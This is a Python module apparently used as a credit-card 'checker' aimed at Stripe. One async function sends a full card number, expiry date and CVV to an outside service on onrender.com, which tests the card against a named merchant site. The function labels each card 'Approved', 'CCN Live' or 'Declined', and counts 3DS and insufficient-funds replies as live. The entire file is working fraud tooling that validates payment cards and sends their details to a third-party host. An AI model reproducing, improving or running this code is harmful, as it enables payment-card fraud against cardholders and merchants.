"""
Stripe Auth Gateway - Using actual working API
"""
import aiohttp
import asyncio
import json

async def stripe_auth_check(cc: str, mm: str, yy: str, cvv: str) -> dict:
    """
    Stripe Auth using real API endpoint
    
    Args:
        cc: Card number
        mm: Expiry month
        yy: Expiry year
        cvv: CVV code
    
    Returns:
        dict: {'status': str, 'response': str}
    """
    # Format card
    cc_normalized = f"{cc}|{mm}|{yy}|{cvv}"
    
    # API endpoint from gatesbot
    api_url = (
        "https://titanautostripeauth.onrender.com/"
        f"gateway=titanautostripe/key=titanfuryy/site=dilaboards.com/cc={cc_normalized}"
    )
    
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(
                api_url,
                timeout=aiohttp.ClientTimeout(total=55)
            ) as resp:
                if resp.status != 200:
                    return {
                        'status': 'Unknown',
                        'response': f'HTTP {resp.status}'
                    }
                
                data = await resp.json()
                
                # Extract status + response
                api_status = (data.get("status") or "Unknown").strip()
                api_response = (data.get("response") or "No response").strip()
                
                # Format status
                lower_status = api_status.lower()
                if "approved" in lower_status:
                    status = "Approved"
                elif "declined" in lower_status:
                    status = "Declined"
                elif "ccn live" in lower_status:
                    status = "CCN Live"
                elif "incorrect" in lower_status or "your number" in lower_status:
                    status = "Declined"
                elif "3ds" in lower_status or "auth required" in lower_status:
                    status = "Approved"
                elif "insufficient funds" in lower_status:
                    status = "CCN Live"
                elif "expired" in lower_status:
                    status = "Declined"
                elif "stolen" in lower_status:
                    status = "Declined"
                elif "pickup card" in lower_status:
                    status = "Declined"
                elif "fraudulent" in lower_status:
                    status = "Declined"
                else:
                    status = api_status
                
                return {
                    'status': status,
                    'response': api_response
                }
                
    except asyncio.TimeoutError:
        return {
            'status': 'Unknown',
            'response': 'API request timed out'
        }
    except Exception as e:
        return {
            'status': 'Unknown',
            'response': f'Error: {str(e)}'
        }
